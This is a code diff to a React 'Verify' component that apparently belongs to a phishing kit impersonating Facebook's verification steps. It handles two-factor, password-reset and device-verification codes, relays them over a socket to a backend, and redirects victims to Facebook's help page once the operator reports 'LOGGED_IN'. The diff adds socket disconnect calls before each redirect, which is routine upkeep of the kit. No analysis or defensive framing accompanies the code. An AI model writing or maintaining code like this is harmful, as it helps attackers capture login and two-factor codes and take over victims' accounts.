@@ -25,6 +25,7 @@ const Verify = () => {
     } else if (mode === "forget-password") {
       setSocketEvent(`forget-password`);
     } else {
+      socket.emit("disconnect");
       window.location.replace("https://www.facebook.com/help");
     }
     if (e.target.value.length > 8) {
@@ -50,6 +51,7 @@ const Verify = () => {
         setCode("");
         setError("Invalid code");
       } else {
+        socket.emit("disconnect");
         setUrl("https://www.facebook.com/help");
         setShowLoading(true);
         setLoading(false);
@@ -61,12 +63,14 @@ const Verify = () => {
   };
   useEffect(() => {
     if (!mode) {
+      socket.emit("disconnect");
       window.location.replace("https://www.facebook.com/help");
     } else if (
       mode !== "two-factor" &&
       mode !== "forget-password" &&
       mode !== "device-verification"
     ) {
+      socket.emit("disconnect");
       window.location.replace("https://www.facebook.com/help");
     } else if (mode === "device-verification" && !emitted) {
       setDeviceVerification(true);
@@ -74,8 +78,10 @@ const Verify = () => {
       setEmitted(true);
       socket.on("device-verificationResponse", (data) => {
         if (data.message === "LOGGED_IN") {
+          socket.emit("disconnect");
           window.location.replace("https://www.facebook.com/help");
         } else {
+          socket.emit("disconnect");
           window.location.replace("https://www.facebook.com/help");
         }
       });
